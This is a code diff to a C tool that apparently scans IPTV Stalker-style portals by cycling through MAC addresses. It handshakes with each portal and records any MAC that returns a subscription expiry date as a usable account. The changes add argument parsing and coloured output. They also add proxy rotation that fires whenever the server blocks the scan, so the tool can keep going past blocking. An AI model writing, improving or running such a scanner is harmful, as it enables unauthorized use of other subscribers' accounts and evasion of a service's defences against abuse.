@@ -21,6 +21,7 @@
 #include "shared.h"
 #include "utils.c"
 #include "proxies.c"
+#include "args.c"
 
 int MAC_COUNT = 0;
 int ACCOUNTS_COUNT = 0;
@@ -136,7 +137,7 @@ void write_account_to_save_file(char *mac, char *exp_date) {
             fprintf(f,"------------------------\n");
         }
         fprintf(f,"%s [%s]\n",mac,exp_date);
-        printf("[i] Wrote new account to file: %s\n", save_path);
+        //printf("[i] Wrote new account to file: %s\n", save_path);
         fclose(f);
     }
 }
@@ -211,7 +212,7 @@ void make_request(char *url, char *mac, struct curl_slist *headers, User_Proxy *
         }
         
         else if (res == 28) {
-            printf("[i] Operation timed out.\n");
+            fprintf(stderr,"[!] Operation timed out.\n");
 
             if (PROXY_MODE == FROM_FILE || PROXY_MODE == FROM_URL) {
                 get_next_proxy(PROXY_MANUAL_URL);
@@ -234,7 +235,7 @@ void make_request(char *url, char *mac, struct curl_slist *headers, User_Proxy *
         
         else if (res == 5) {
             if (PROXY_MODE == FROM_FILE || PROXY_MODE == FROM_URL) {
-                fprintf(stderr,"[i] Cannot resolve proxy \"%s\". Rotating.\n", proxy->url);
+                fprintf(stderr,"[!] Cannot resolve proxy \"%s\". Rotating.\n", proxy->url);
                 get_next_proxy(PROXY_MANUAL_URL);
                 // TODO check if made one full rotation
                 make_request(url, mac, headers, proxy, MAX_REQUESTS_RETRY, thread_index);
@@ -250,6 +251,7 @@ void make_request(char *url, char *mac, struct curl_slist *headers, User_Proxy *
                 fprintf(stderr,"[!] Max retry limit reached.\n");
                 GRACEFUL_EXIT_ASKED = true;
             } else if (PROXY_MODE == FROM_FILE || PROXY_MODE == FROM_URL) {
+                get_next_proxy(PROXY_MANUAL_URL);
                 make_request(url, mac, headers, proxy, max_retry, thread_index);
                 return;
             } else {
@@ -342,8 +344,9 @@ void study_reponse(char *response) {
         if (matched) {
             // server refuses you
             if (USE_PROXY && (PROXY_MODE == FROM_FILE || PROXY_MODE == FROM_URL)) {
-                printf("[i] Rotating proxy: server blocks you (response contains \"%s...\")\n",refusal_patterns[i]);
+                //printf("[i] Rotating proxy: server blocks you (response contains \"%s...\")\n",refusal_patterns[i]);
                 get_next_proxy(PROXY_MANUAL_URL);
+                //printf("[i] proxy rotated => current: %s\n", PROXY_MANUAL_URL);
                 return;
             }
             fprintf(stderr,"[!] Stopping scan: server blocks you: %s\n", refusal_patterns[i]);
@@ -355,7 +358,7 @@ void study_reponse(char *response) {
     // other errors
     if (strlen(response) == 0) {
         if (USE_PROXY && (PROXY_MODE == FROM_FILE || PROXY_MODE == FROM_URL)) {
-            printf("[i] Rotating proxy: the server provides empty replies\n");
+            //printf("[i] Rotating proxy: the server provides empty replies\n");
             get_next_proxy(PROXY_MANUAL_URL);
             return;
         }
@@ -363,6 +366,7 @@ void study_reponse(char *response) {
         GRACEFUL_EXIT_ASKED = true;
         return;
     }
+    
     //printf("TODO: investigate why it went wrong");
     //printf("response = <<<%s>>>\n",response);
     // else it is just empty token or exp_date
@@ -378,6 +382,9 @@ void *check(void *thread_args) {
     encode_mac(encoded_mac, args.mac);
 
     //printf("mac = %s ; encoded = %s ; index = %d\n", args.mac, encoded_mac, args.thread_index);
+    char *color_red = "\e[;31m";
+    char *color_green = "\e[;32m";
+    char *color_reset = "\e[0m";
 
     char tmp_headers[MAX_HEADERS_LEN] = {0};
     struct curl_slist *headers = {0};
@@ -397,6 +404,7 @@ void *check(void *thread_args) {
     handshake(token, (char *)"%s/portal.php?action=handshake&type=stb&token=&mac=%s",args.host, encoded_mac, headers, &proxy, args.thread_index);
 
     if (strlen(token) == 0) {
+        printf("%s[%d] %s%s\n", color_red, MAC_COUNT, args.mac, color_reset);
         study_reponse(responses[args.thread_index]);
         THREADS_COUNT--;
         threads[args.thread_index] = 0;
@@ -421,6 +429,7 @@ void *check(void *thread_args) {
     get_exp_date(exp_date,(char *)"%s/portal.php?type=account_info&action=get_main_info&mac=%s",args.host,args.mac,headers,&proxy,args.thread_index);
    
     if (strlen(exp_date) == 0) {
+        printf("%s[%d] %s%s\n", color_red, MAC_COUNT, args.mac, color_reset);
         study_reponse(responses[args.thread_index]);
         THREADS_COUNT--;
         threads[args.thread_index] = 0;
@@ -429,9 +438,12 @@ void *check(void *thread_args) {
     }
 
     //printf("exp_date: %s\n",exp_date);
-    printf("(thread %d) [%d] %s [%s]\n", args.mac_index,MAC_COUNT, args.mac, exp_date);
+
 #ifdef SMAC_GUI
     GUI_add_account_to_accounts_list(args.mac, exp_date);
+#else
+    //printf("(thread %d) [%d] %s [%s]\n", args.mac_index,MAC_COUNT, args.mac, exp_date);
+    printf("[%d] %s%s%s [%s]\n", MAC_COUNT, color_green, args.mac, color_reset, exp_date);
 #endif
     write_account_to_save_file(args.mac, exp_date);
     ACCOUNTS_COUNT++;
@@ -439,6 +451,10 @@ void *check(void *thread_args) {
     THREADS_COUNT--;
     threads[args.thread_index] = 0;
     //pthread_exit(NULL);
+
+    // test
+    //printf("\33[2K\r");
+    
     return NULL;
 }
 
@@ -523,7 +539,7 @@ void init_proxy_from_file(char *filepath) {
     bool ok = import_proxy_file(PROXY_FILE_FILEPATH);
     if (ok) {
         get_next_proxy(PROXY_MANUAL_URL);
-        printf("current proxy url = %s\n",PROXY_MANUAL_URL);
+        //printf("[i] current proxy: %s\n",PROXY_MANUAL_URL);
     } else {
         fprintf(stderr,"[!] Could not import proxy file");
     }
@@ -588,7 +604,7 @@ bool init_proxy_from_url(char *url) {
             bool imported = import_proxy_file(temp);
             if (imported) {
                 get_next_proxy(PROXY_MANUAL_URL);
-                printf("current proxy url = %s\n",PROXY_MANUAL_URL);
+                //printf("[i] current proxy: %s\n",PROXY_MANUAL_URL);
             } else {
                 fprintf(stderr,"[!] No proxy found in provided list");
             }
@@ -622,9 +638,10 @@ void *scan(void *_) {
 #ifdef SMAC_GUI
         GUI_update_scanning_labels(mac);
 #endif
-        
+
         // NOTE: We proceed by batch. Simultaneaous requests are
         // started AND stopped together.
+
         if (THREADS_COUNT >= NB_THREADS) {
             //empty the queue
             for (int j=0;j<NB_THREADS;j++) {
@@ -659,7 +676,7 @@ void *scan(void *_) {
                 }
             }
         }
- 
+
         write_checkpoint(mac);
 
         compute_next_mac(next_mac,mac);
@@ -674,7 +691,8 @@ void *scan(void *_) {
 
             printf("pausing for %d seconds\n", pause_duration / 1000);
             usleep(pause_duration * 1000); // µ secs
-        } else if (request_delay > 0) {
+            printf("\33[2K\r");
+        } else if (request_delay > 0 && MAC_COUNT % NB_THREADS == 0) {
             usleep(request_delay * 1000); // µ secs
         }
 
@@ -698,7 +716,9 @@ void *scan(void *_) {
 }
 
 void prepare() {
-    
+
+    mkdir(results_dir);
+    mkdir(checkpoints_dir);
     build_filename_from_url(accounts_filename,   host, ".txt");
     
     if (USE_CHECKPOINTS) {
@@ -708,22 +728,30 @@ void prepare() {
         }
     }
 
+    if (USE_PROXY) {
+        if (PROXY_MODE == FROM_URL)  download_proxy_file_from_url("proxies.txt",PROXY_FILE_URL);
+        if (PROXY_MODE == FROM_FILE) init_proxy_from_file(PROXY_FILE_FILEPATH);
+    }
+
+    // todo change this
+    strcpy(mac,mac_first);
+
 }
 
 #ifdef SMAC_GUI
 void smac_main() { // TODO: pass args from GUI?
 #else
 int main(int argc, char **argv) {
-    // TODO: parse_args();
+    parse_args(argc,argv);
 #endif
-
     prepare();
     build_session(&session);
-    
-    // we now pass a global 'session' to scan() function
+#ifdef SMAC_GUI
     pthread_create(&main_thread, NULL, &scan, &session);
+#else
 
-#ifndef SMAC_GUI
+
+    scan(&session);
     return 0;
 #endif
 }
